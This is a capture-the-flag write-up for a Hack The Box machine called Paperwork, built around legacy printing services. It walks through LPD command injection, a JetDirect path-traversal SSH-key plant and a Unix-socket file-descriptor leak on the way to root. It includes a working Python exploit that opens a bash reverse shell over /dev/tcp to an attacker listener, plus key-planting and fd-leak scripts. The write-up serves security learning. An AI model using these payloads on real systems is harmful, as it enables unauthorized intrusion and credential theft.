---
title: Paperwork
layout: post
released: 2026-07-11
creators: LazyTitan33
pwned: true
tags:
  - boxes
  - os/linux
  - diff/easy
  - type/machine
category:
  - HTB
description: Paperwork is a Linux Easy box built entirely around legacy printing protocols. A custom LPD (Line Printer Daemon) service leaks its own source code and turns out to be vulnerable to shell command injection, giving RCE as lp. From there, a loopback-only HP JetDirect/PJL emulator running as archivist has a classic path traversal bug in its hand-rolled virtual filesystem, letting us plant an SSH key and grab the user flag. Root comes from a "security monitoring" daemon whose lockdown response leaks a root-owned file descriptor over a Unix socket via SCM_RIGHTS, handing over an admin password that's reused for root SSH.
image: /assets/img/img_Paperwork/paperwork-logo.png
cssclasses:
  - custom_htb
---
![HTB](/assets/img/img_Paperwork/paperwork-logo.png)

Paperwork leans hard into its theme. Every service on the box is some flavor of old-school office printing infrastructure — an LPD spooler, a fake HP JetDirect printer, a "security" daemon watching over both — and every single one of them turns out to have the same underlying mistake: trusting whatever the client on the other end of a socket says, instead of what it's actually allowed to do. Three completely different bug classes (command injection, path traversal, and a Unix domain socket file-descriptor leak), chained end to end, get us from anonymous to root.

<!--more-->

# Enumeration
## Scans

A port scan turns up a small, slightly unusual surface for a corporate "archiving" box:

```
$ nmap -p- -T4 10.129.248.117 --min-rate=5000
...
Nmap scan report for paperwork.htb (10.129.248.117)
Host is up (0.17s latency).
Not shown: 65483 closed tcp ports (reset), 49 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1515/tcp open  ifor-protocol
```
{:filename="nmap-p-.txt"}

![nmap scan](/assets/img/img_Paperwork/paperwork-nmap-scan.png)

```
$ nmap -p22,80,1515 -sCV -T4 --min-rate=5000 10.129.248.117
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.28.0 (Ubuntu)
|_http-title: Intranet | Document Archiving Service
1515/tcp open  ifor-protocol?
| fingerprint-strings:
|_    Archive_Printer is ready and printing.
```
{:filename="nmap-sCV.txt"}

![nmap service scan](/assets/img/img_Paperwork/paperwork-nmap-service-scan.png)

nmap can't identify port 1515 at all (`ifor-protocol?`, a guess) — but its fingerprint probe already snagged the banner *"Archive_Printer is ready and printing."*, which turns out to be the literal string the daemon sends back for LPD commands `03`/`04`, straight out of its own source. It's the interesting port either way. LPD (Line Printer Daemon) is a genuinely ancient protocol — RFC 1179 dates to 1990 — and finding a *hand-written* implementation of it rather than a stock package strongly suggests the box wants its source code read, not just fuzzed blind.

## 80 - Web Server

Adding `paperwork.htb` to `/etc/hosts` and browsing to it gives an "Intranet — Document Archiving Service" page:

![Paperwork intranet page](/assets/img/img_Paperwork/paperwork-web.png)

Two details matter here:

- A maintenance banner: *"Backend spooler `PRN-ARCHIVE-01` management console is currently offline. Manual ingestion remains active via the legacy gateway."* — foreshadowing for a management daemon we run into much later.
- A download link, `/download/archive`, serving `paperwork-archive-v1.02.zip` — which contains nothing less than **the LPD server's own source code**, `server.py`.

That download is the key that unlocks the whole box.

# User
## Reading `server.py`

The LPD daemon (`lpdserver.service`, running as user `lp`) implements just enough of RFC 1179 to accept a print job:

```python
def handle_print_job(self, data):
    queue = data[1:].decode().strip()
    if queue not in VALID_QUEUE:
        ...
        return
    ...
    while True:
        chunk = self.sock.recv(1024)
        ...
        parts = chunk[1:].decode(errors='ignore').split()
        size = int(parts[0])
        content = b""
        while len(content) < size:
            content += self.sock.recv(size - len(content) + 1)
        decoded_content = content.decode(errors='ignore')

        job_name = "Unknown"
        for line in decoded_content.split('\n'):
            line = line.strip()
            if line.startswith('J'):
                job_name = line[1:]
                break

        subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```
{:filename="server.py"}

Two bugs jump out:

**A cosmetic one first** — `if queue not in VALID_QUEUE` is a *substring* check on a plain string (`VALID_QUEUE` comes straight from an env var, `archive_intake`), not a real membership test against a list. It doesn't open anything extra here since the real queue name still has to match, but it's the kind of sloppy validation that becomes exploitable the moment there's more than one legitimate value to get confused with.

**The real one** — `job_name` is parsed straight out of attacker-controlled data (a line starting with `J` inside the client-supplied "control file") and dropped, completely unsanitized, into an f-string executed with `shell=True`:
```python
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```
A single quote inside `job_name` closes the quoted string early, and everything after it gets parsed by `/bin/sh` as a brand new command. Textbook shell injection.

## Exploiting the LPD Daemon → RCE as `lp`

To reach `handle_print_job` we only need to speak the bare minimum of the LPD handshake:

| Step | We send | Server does |
|---|---|---|
| 1 | `\x02archive_intake\n` (cmd `02` = receive a print job, plus the queue name) | validates queue, replies `\x00` |
| 2 | subcommand byte + `"<size> <control-file-name>\n"` | reads header, replies `\x00` |
| 3 | `<size>` bytes of control-file content, containing a line `J<payload>` | parses `job_name`, runs the vulnerable `Popen` |

The payload just needs to close and reopen the single quotes cleanly:
```
x'; <our command>; echo '
```
`x` fills the harmless first half of the original `echo`, `;` ends that statement, our injected command runs, and `echo '` reopens a quote so the tail of the original string (`' >> /tmp/archive.log`) still parses fine.

For the injected command, a plain classic reverse shell over `/dev/tcp`:

```python
import socket

TARGET = "10.129.248.117"
PORT = 1515
LHOST = "10.10.17.34"
LPORT = 44412

payload = f"x'; bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'; echo '"
cfile = f"J{payload}\nHhost\nPuser\n".encode()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET, PORT))
s.send(b'\x02archive_intake\n')
print(s.recv(1024))  # expect \x00

s.send(b'\x02' + f"{len(cfile)} cfA001host\n".encode())
print(s.recv(1024))  # ack
s.send(cfile)
print(s.recv(4096))
s.close()
```
{:filename="poc.py"}

With a listener up first (`penelope -i tun0 -p 44412`), running it:

![Running the LPD command injection PoC](/assets/img/img_Paperwork/paperwork-poc.png)

Three acks back (`b'\x00'` × 3 — queue accepted, control-file header accepted, job executed), and the shell lands:

![First shell as lp](/assets/img/img_Paperwork/paperwork-foothold.png)

```
[+] [New Reverse Shell] => paperwork 10.129.248.117 Linux-x86_64 lp(7)
[+] Upgrading shell to PTY... successful via /usr/bin/python3

lp@paperwork:/opt/LPDServer$ ls
server.py
lp@paperwork:/opt/LPDServer$ uname -a
Linux paperwork 6.17.0-40-generic #40-Ubuntu SMP PREEMPT_DYNAMIC Fri Jun 19 16:42:13 UTC 2026 x86_64 GNU/Linux
```
{:filename="foothold.txt"}

**Foothold as `lp` achieved.** (For later steps we also scripted a small persistent bind-shell to run one-shot commands without re-triggering the injection every time — not part of the core chain, just automation plumbing.)

## Enumeration as `lp`

Standard checks came back mostly clean — no `sudo` installed at all, stock SUID/SGID binaries, nothing unusual in cron. Two things stood out.

`/usr/bin/bash` is world-writable:
```
$ ls -la /usr/bin/bash
-rwxrwxrwx 1 root root 1544408 Sep  8  2025 /usr/bin/bash
```
A serious misconfiguration in principle — if any root-owned process ever shells out via `/usr/bin/bash`, replacing it (write-temp-then-rename, since the file's normally "busy") would be instant root. We went looking for a live trigger (cron.hourly/daily shebangs, systemd timers, anything in `/etc` invoking bash as root) and came up empty. Flagged it as a real finding for the report; it just isn't the intended path on this box.

More useful: four custom systemd services.

| Unit | User | What |
|---|---|---|
| `lpdserver.service` | `lp` | our foothold |
| `jetdirect.service` | **archivist** | `jetdirect.py 9100 /home/archivist/printer/ .../commands.log` — bound to `127.0.0.1:9100` only |
| `corposite.service` | **root** | the Flask app nginx proxies on port 80 |
| `paperwork.service` | **root** | `/usr/bin/paperwork-daemon`, `Restart=always` |

`/usr/bin/paperwork-daemon` is world-readable, and its source is where the eventual root path comes from:

```python
admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)   # root, opened once at startup

def scan_for_malice():
    with open(LOG_PATH, 'r') as f:                       # /home/archivist/printer/logs/commands.log
        content = f.read().upper()
        return any(t in content for t in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"])

def trigger_lockdown(conn):
    conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS,
                           array.array("i", [log_fd, admin_fd]))])
    ...

while True:
    conn, _ = s.accept()
    if scan_for_malice():
        trigger_lockdown(conn)
    else:
        token = hashlib.sha256(f"SYSTEM_CLEAN:{secret}".encode()).hexdigest()
        conn.sendall(f"STATUS: SYSTEM_CLEAN\nSIGNATURE: {token}\n".encode())
```
{:filename="paperwork-daemon"}

In plain English: a root process keeps a permanent open handle on a secrets file only root can read, and listens on a Unix socket (`/run/paperwork/mgmt.sock`, mode `0660`, `root:archivist`) for a management client to check in. If everything looks clean, it hands back a *signed hash* of the secret — safe. But if it thinks something suspicious happened, it switches into "lockdown/forensics" mode and hands the raw file descriptor for the secrets file to whoever's connected, via `SCM_RIGHTS`. The "security" response is *more* dangerous than the normal one — but the socket's group is `archivist`, so `lp` can't touch it yet. We need to become `archivist` first, and that pointed straight at `jetdirect.service`.

## Pivoting to `jetdirect`

`jetdirect.service` runs as `archivist` but only listens on `127.0.0.1:9100`. With code execution as `lp` already in hand, the fix is a tiny TCP relay dropped straight onto the box, forwarding an external port to that loopback service.

The service speaks a stripped-down HP PJL dialect — `@PJL INFO ID` replies `HP LASERJET 4ML` — and supports filesystem-style commands (`FSDIRLIST`, `FSUPLOAD`, `FSDOWNLOAD`) against a "virtual" volume `0:` that's really just `/home/archivist/printer/` on disk.

> **An honest aside:** the first attempt at pulling the service's own source used a guessed `FSUPLOAD` request before its exact wire format was understood. That wedged it completely — it's single-threaded with no read timeouts, and the malformed request left the handler blocked mid-read forever. `Restart=on-failure` doesn't help a hang, only a crash, and `lp` has no privilege to kill another user's process. The only fix was resetting the box and starting the JetDirect enumeration over — this time pulling the exact file size from a directory listing first, and checking the service's health after every single request before sending the next one.

Done carefully, a clean `FSUPLOAD` for the exact byte size reported by `FSDIRLIST` pulls back the full source:
```
@PJL FSUPLOAD NAME="0:\jetdirect.py" OFFSET=0 SIZE=5119
```

And there's the real bug, in the filesystem abstraction's path handling:

```python
class Filesystem:
    def __init__(self, root_dir):
        self._root = os.path.abspath(root_dir)          # /home/archivist/printer

    def _translate(self, path):
        clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
        return os.path.normpath(os.path.join(self._root, clean))

    def read(self, path):
        target = self._translate(path)
        if os.path.isfile(target):
            with open(target, "rb") as f: return f.read()

    def write(self, path, data):
        target = self._translate(path)
        os.makedirs(os.path.dirname(target), exist_ok=True)
        with open(target, "wb") as f: f.write(data)
        return "OK"
```
{:filename="jetdirect.py"}

A textbook path traversal: it strips the fake `0:` volume label, converts backslashes to forward slashes, strips a *leading* slash, joins onto the real root, then normalizes — **without ever checking the result is still inside `self._root`**. A `NAME` full of `..` segments walks straight out of the sandbox:

```
root:  /home/archivist/printer                                 (3 segments: home, archivist, printer)
input: 0:\..\..\..\home\archivist\.ssh\authorized_keys
  → strip "0:"        → \..\..\..\home\archivist\.ssh\authorized_keys
  → backslash→slash   → /../../../home/archivist/.ssh/authorized_keys
  → lstrip("/")        → ../../../home/archivist/.ssh/authorized_keys
  → join + normpath     → /home/archivist/.ssh/authorized_keys
```

Three `..` segments are exactly enough to climb out of `printer/` → `archivist/` → `home/` and land back at `/`, then walk straight back down into archivist's SSH directory. Because `jetdirect.service` runs as `User=archivist`, both `read()` and `write()` operate with archivist's *real* filesystem permissions — completely outside the intended print-spool sandbox. `write()` even calls `os.makedirs(..., exist_ok=True)` for us, so `.ssh` doesn't even need to exist first.

## `lp` → `archivist`

Generate a keypair, then send a raw `FSDOWNLOAD` — the command line followed immediately by the exact number of raw bytes declared in `SIZE`:

```python
name = r'0:\..\..\..\home\archivist\.ssh\authorized_keys'
header = f'@PJL FSDOWNLOAD NAME="{name}" SIZE={len(pubkey)}\r\n'.encode()
s.send(header + pubkey)
```
{:filename="pjl_write.py"}

```
$ python3 pjl_write.py archivist_key.pub
b'OK\r\n'

$ ssh -i archivist_key archivist@paperwork.htb
uid=1000(archivist) gid=1000(archivist) groups=1000(archivist)

$ cat ~/user.txt
944[REDACTED]
```

# Root
## Reaching the management socket

Back to `paperwork-daemon`. Two conditions needed to be true to get it to leak the admin secret:

1. Be able to *connect* to `/run/paperwork/mgmt.sock` — it's group `archivist`, and we now are archivist. ✅
2. `commands.log` needs to contain `FSQUERY`/`FSUPLOAD`/`FSDOWNLOAD` (case-insensitive) to flip the daemon into lockdown mode. It already does — every JetDirect command sent while pivoting got logged there by `jetdirect.py` itself. ✅

So the very next connection triggers the leak. All that's needed on our end is to receive the ancillary data properly:

```python
import socket, array, os

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")
msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_LEN(2 * 4))

fds = array.array("i")
for level, type_, data in ancdata:
    if level == socket.SOL_SOCKET and type_ == socket.SCM_RIGHTS:
        fds.frombytes(data[: len(data) - (len(data) % fds.itemsize)])

for fd in fds:
    print(f"fd {fd}:", os.pread(fd, 4096, 0))
```
{:filename="leak_fd.py"}

Run as `archivist` over SSH:
```
msg: b'ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.'
fds: [4, 5]
fd 4: b'Listening on port 9100\n...(log contents)...'
fd 5: b'ADMIN_PASSWORD=App[REDACTED]\n'
```
{:filename="leak_fd_output.txt"}

`os.pread()` on the received file descriptor reads `/etc/paperwork/admin_pins.conf` (mode `600`, owned `root:root`) directly — no POSIX permission check ever fires, because we're not opening the file ourselves, we're reading from a descriptor the kernel already handed us. That's the entire bug in one sentence: **`open()` permission checks happen at open time, not at read time.** Once a file descriptor has been passed to you — by any means, including this daemon's own "security" feature — the file's permission bits are irrelevant.

## `archivist` → `root`

The recovered credential turned out to be reused directly as the root SSH password:

```
$ ssh root@paperwork.htb
Password: App[REDACTED]

uid=0(root) gid=0(root) groups=0(root)

$ cat /root/root.txt
6d2[REDACTED]
```

Just like that, we have root.

# Summary

| # | Vulnerability | Location | Result |
|---|---|---|---|
| 1 | Shell command injection via unsanitized job name in `subprocess.Popen(..., shell=True)` | LPD server, port 1515 | RCE as `lp` |
| 2 | Path traversal in a hand-rolled virtual filesystem (`_translate()` never checks the resolved path stays under root) | `jetdirect.py`, running as `archivist` | Arbitrary file read/write → SSH key planted → **user** |
| 3 | Logic flaw: a "security lockdown" response leaks a root-owned file descriptor via `SCM_RIGHTS` instead of protecting the secret | `paperwork-daemon`, `/run/paperwork/mgmt.sock` | Recovered admin password |
| 4 | Password reuse | root's SSH credentials | **root** |

A couple of things worth remembering from this one, beyond the box itself: file descriptors don't carry permission checks with them — any code path that can be tricked into forwarding a privileged fd to an unprivileged peer is a full bypass of the filesystem permission model, no matter how locked-down the file looks. And when reverse-engineering an unfamiliar binary protocol, it pays to read the source (or fingerprint very conservatively) before sending anything with size fields or expected follow-up bytes — a guessed request that doesn't match the real framing can hang a naive single-threaded server forever, with no polite way to un-hang someone else's process without privilege to kill it.
